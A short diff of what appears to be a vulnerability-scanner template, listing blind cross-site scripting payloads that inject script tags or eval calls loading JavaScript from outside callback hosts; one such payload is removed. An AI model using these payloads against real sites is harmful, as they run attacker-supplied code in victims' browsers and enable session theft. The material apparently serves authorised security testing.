@@ -29,7 +29,6 @@ http:
         - "</script><script src='https://satya.ez.pe'></script>"
         - "<script src=//satya.ez.pe></script>"
         - "'><script src=https://satya.bxss.in></script>"
-        - "javascript:eval('var a=document.createElement('script');a.src='https://satya.bxss.in';document.body.appendChild(a)')"
         - "<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//satya.bxss.in");a.send();</script>"
         - "<script>$.getScript("//satya.bxss.in")</script>"
 
